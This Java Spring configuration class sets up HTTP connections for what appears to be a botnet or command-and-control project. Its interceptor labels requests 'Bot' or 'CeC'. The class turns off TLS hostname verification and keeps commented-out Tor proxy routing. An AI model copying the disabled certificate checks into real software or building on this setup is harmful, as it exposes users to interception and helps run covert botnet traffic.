package cs.sii.service.connection;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.InetSocketAddress;
import java.net.Proxy;
import java.net.URI;
import java.net.URISyntaxException;
import java.security.KeyManagementException;
import java.security.KeyStoreException;
import java.security.NoSuchAlgorithmException;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Properties;

import org.apache.catalina.connector.Connector;
import org.apache.http.HttpException;
import org.apache.http.HttpHost;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.impl.client.HttpClientBuilder;
import org.apache.http.impl.conn.DefaultProxyRoutePlanner;
import org.apache.http.protocol.HttpContext;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.context.embedded.ConfigurableEmbeddedServletContainer;
import org.springframework.boot.context.embedded.EmbeddedServletContainerCustomizer;
import org.springframework.boot.context.embedded.tomcat.TomcatEmbeddedServletContainerFactory;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.http.HttpHeaders;
import org.springframework.http.HttpMethod;
import org.springframework.http.HttpRequest;
import org.springframework.http.MediaType;
import org.springframework.http.client.*;
import org.springframework.http.converter.json.MappingJackson2HttpMessageConverter;
import org.springframework.security.authentication.AuthenticationTrustResolver;
import org.springframework.security.authentication.AuthenticationTrustResolverImpl;
import org.springframework.web.client.RestTemplate;

import cs.sii.config.onLoad.Config;

@Configuration
public class ConnectionServiceConfig {

	@Autowired
	Config configEngine;

	@Value("${http.port}")
	private int httpPort;

	@Bean
	public EmbeddedServletContainerCustomizer containerCustomizer() {
	        return new EmbeddedServletContainerCustomizer() {
	            @Override
	            public void customize(ConfigurableEmbeddedServletContainer container) {
	                if (container instanceof TomcatEmbeddedServletContainerFactory) {
	                    TomcatEmbeddedServletContainerFactory containerFactory =
	                            (TomcatEmbeddedServletContainerFactory) container;

	                    Connector connector = new Connector(TomcatEmbeddedServletContainerFactory.DEFAULT_PROTOCOL);
	                    connector.setPort(httpPort);
	                    containerFactory.addAdditionalTomcatConnectors(connector);
	                }
	            }
	        };
	}

	@Bean
	public MySSLClientHttpRequestFactory HttpRequestFactory() throws KeyManagementException, NoSuchAlgorithmException, KeyStoreException, URISyntaxException, IOException {

		NullHostnameVerifier verifier=new NullHostnameVerifier();
		MySSLClientHttpRequestFactory crf = new MySSLClientHttpRequestFactory(verifier);
		
		crf.setConnectTimeout(configEngine.getConnectTimeout());
//		crf.setConnectionRequestTimeout(configEngine.getRequestTimeout());
		crf.setReadTimeout(configEngine.getReadTimeout());




		//TODO verificare Tor proxy e host
		// HttpHost proxy = new HttpHost("127.0.0.1", 9050);
		//HttpClient httpClient = HttpClientBuilder.create().setSSLHostnameVerifier(verifier).setProxy(proxy).build();
		//Proxy proxy = new Proxy(Proxy.Type.SOCKS, new InetSocketAddress("127.0.0.1", 9050));
		//Proxy torProxy= new Proxy(Proxy.Type.valueOf(configEngine.getProxytype()), new InetSocketAddress(configEngine.getProxyhost(),configEngine.getProxyport()));
		//crf.setProxy(proxy);

		return crf;

	}
	@Bean
	public AuthenticationTrustResolver getAuthenticationTrustResolver() {
		return new AuthenticationTrustResolverImpl();
	}





	@Bean
	public RestTemplate RestTemplate() throws KeyManagementException, NoSuchAlgorithmException, KeyStoreException, IOException, URISyntaxException {

		RestTemplate restTemplate = new RestTemplate(HttpRequestFactory());


		List<MediaType> mediaTypes = new ArrayList<MediaType>();
		mediaTypes.add(MediaType.TEXT_PLAIN);
		restTemplate.setInterceptors(Collections.singletonList(new XUserAgentInterceptor()));
		MappingJackson2HttpMessageConverter mc = new MappingJackson2HttpMessageConverter();
		mc.setSupportedMediaTypes(mediaTypes);
		restTemplate.getMessageConverters().add(mc);
		return restTemplate;
	}

	
	public class XUserAgentInterceptor implements ClientHttpRequestInterceptor {

	    @Override
	    public ClientHttpResponse intercept(
	            HttpRequest request, byte[] body, ClientHttpRequestExecution execution)
	            throws IOException {

	        HttpHeaders headers = request.getHeaders();
	    	if (!configEngine.isCommandandconquerStatus()) {
	        headers.add("X-User-Agent", "Bot");}
	    	else  headers.add("X-User-Agent", "CeC");
	        
	        return execution.execute(request, body);
	    }
	}
}